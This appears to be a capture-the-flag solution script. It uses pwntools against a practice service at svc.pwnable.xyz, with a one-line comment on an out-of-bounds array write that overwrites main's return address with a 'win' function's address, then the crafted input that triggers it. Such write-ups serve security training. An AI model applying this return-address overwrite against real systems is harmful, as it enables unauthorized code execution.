#vulnerability: v7[v6]=v4+v5 <- v7[v6] can overwrite return address of main function with the address of the function win.
from pwn import *
s=remote("svc.pwnable.xyz",30002)
s.recv(1024)
s.send("0 4196386 13\n")
s.recv(1024)
s.send("a b c\n")
s.interactive()
s.close()